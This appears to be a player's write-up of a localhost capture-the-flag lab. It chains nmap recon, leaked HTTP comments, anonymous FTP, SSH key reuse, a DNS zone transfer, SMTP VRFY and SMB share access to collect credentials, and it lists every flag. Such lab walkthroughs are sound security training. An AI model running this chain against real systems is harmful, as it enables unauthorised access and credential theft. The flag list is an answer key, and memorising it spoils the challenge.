# Mission Log: Trailblazer Corp (Player POV)
**Status:** Mission Complete  
**Scope:** Local/LAN (shared instance)  

---

## Recon (nmap)
```bash
nmap -sC -sV -p 8082,2121,2222,5354,2525,1445 127.0.0.1
```
Findings: HTTP 8082 (Flask), FTP 2121 (anon), SSH 2222, DNS 5354, SMTP 2525, SMB 1445.

---

## Step 1 – HTTP (Honkai-themed portal)
- Open `http://127.0.0.1:8082/`.
- View Page Source / DevTools. QA comments in the script reveal:
  - FTP mirror: `ftp://anonymous:anon123@localhost:2121` (use `-a` to see hidden `.releases/`)
  - HTTP flag: `STELKCSC{http_enum_lfi}`
- (Optional) `/docs/?doc=/app/welcome.msg` works, but the main hint/flag is in the source comment.

---

## Step 2 – FTP (hidden release cache)
```bash
ftp -P 2121 127.0.0.1
# user: anonymous  pass: <empty>
ftp> ls
NOTICE.txt   # says artifacts hidden under .releases/
ftp> ls -la
# shows .releases/
ftp> cd .releases
ftp> get flag_ftp.txt
ftp> get ssh_key.pem
```
- Flag FTP: `STELKCSC{ftp_anon_brute}`
- `ssh_key.pem` contains passphrase comment: `trailblazer2025`.

---

## Step 3 – SSH (key + passphrase)
```bash
chmod 600 ssh_key.pem
ssh -i ssh_key.pem -p 2222 sysadmin@127.0.0.1
# passphrase: trailblazer2025
ls /home/sysadmin/files
cat /home/sysadmin/files/flag_ssh.txt
cat /home/sysadmin/files/hints_ssh.txt
```
- Flag SSH: `STELKCSC{ssh_key_reuse}`
- Hints reveal SMTP user/domain (smbuser@trailblazer.corp).

---

## Step 4 – DNS (zone transfer)
```bash
dig AXFR @127.0.0.1 -p 5354 trailblazer.corp
```
- Flag DNS TXT: `STELKCSC{dns_zone_xfer}`
- TXT hint for SMB: share `finance_backup`, user `smbuser` (no password here).

---

## Step 5 – SMTP (VRFY leak)
```bash
telnet 127.0.0.1 2525
VRFY smbuser@trailblazer.corp
```
- Response leaks SMB password `smbpass123`.
- Flag SMTP: `STELKCSC{smtp_vrfy_relay}`

---

## Step 6 – SMB (loot + master)
```bash
smbclient //127.0.0.1/finance_backup -U smbuser
# password: smbpass123
smb: \> ls
smb: \> get flag_smb.txt
smb: \> get master_flag.txt
```
- Flag SMB: `STELKCSC{smb_null_shares}`
- MASTER: `STELKCSC{protocol_chain_mastery_2025}`

---

## Flag Summary
- HTTP: `STELKCSC{http_enum_lfi}`
- FTP: `STELKCSC{ftp_anon_brute}`
- SSH: `STELKCSC{ssh_key_reuse}`
- DNS: `STELKCSC{dns_zone_xfer}`
- SMTP: `STELKCSC{smtp_vrfy_relay}`
- SMB: `STELKCSC{smb_null_shares}`
- MASTER: `STELKCSC{protocol_chain_mastery_2025}`

---

## Notes (shared instance)
- SMB now only serves the SMB/master loot (mounted from `services/smb/share/`).
- DNS no longer leaks the SMB password; SMTP VRFY is required for the creds.
- HTTP hint/flag lives in page source comments; FTP artifacts are hidden in `.releases/`.
